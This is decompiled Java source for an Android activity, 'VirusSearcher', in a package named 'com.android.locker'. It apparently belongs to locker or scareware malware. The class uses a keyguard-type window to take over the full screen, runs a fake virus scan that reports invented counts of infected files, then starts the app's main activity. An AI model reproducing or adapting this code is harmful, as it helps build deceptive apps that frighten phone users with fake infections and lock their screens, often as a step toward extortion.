package com.android.locker;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.SystemClock;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.android.locker.MainActivity.mainActivity;

public class VirusSearcher extends Activity {
    int current = 0;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        getWindow().setType(2009);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.searcher);
        final TextView tv = (TextView) findViewById(R.id.tvSearch);
        final ProgressBar progress = (ProgressBar) findViewById(R.id.progress);
        progress.setMax(700);
        new Thread(new Runnable() {
            public void run() {
                while (VirusSearcher.this.current < 700) {
                    final TextView textView;
                    VirusSearcher virusSearcher = VirusSearcher.this;
                    virusSearcher.current++;
                    progress.setProgress(VirusSearcher.this.current);
                    SystemClock.sleep(10);
                    if (VirusSearcher.this.current < 100) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("00 FILES FOUND!");
                            }
                        });
                    }
                    if (VirusSearcher.this.current > 100 && VirusSearcher.this.current < 150) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("01 FILES FOUND!");
                            }
                        });
                    }
                    if (VirusSearcher.this.current > 150 && VirusSearcher.this.current < 190) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("03 FILES FOUND!");
                            }
                        });
                    }
                    if (VirusSearcher.this.current > 190 && VirusSearcher.this.current < 240) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("05 FILES FOUND!");
                            }
                        });
                    }
                    if (VirusSearcher.this.current > 240 && VirusSearcher.this.current < 300) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("11 FILES FOUND!");
                            }
                        });
                    }
                    if (VirusSearcher.this.current > 450 && VirusSearcher.this.current < 700) {
                        virusSearcher = VirusSearcher.this;
                        textView = tv;
                        virusSearcher.runOnUiThread(new Runnable() {
                            public void run() {
                                textView.setText("17 FILES FOUND!");
                            }
                        });
                    }
                }
                Intent intent = new Intent(VirusSearcher.this, mainActivity.class);
                intent.addFlags(268435456);
                VirusSearcher.this.startActivity(intent);
            }
        }).start();
    }
}
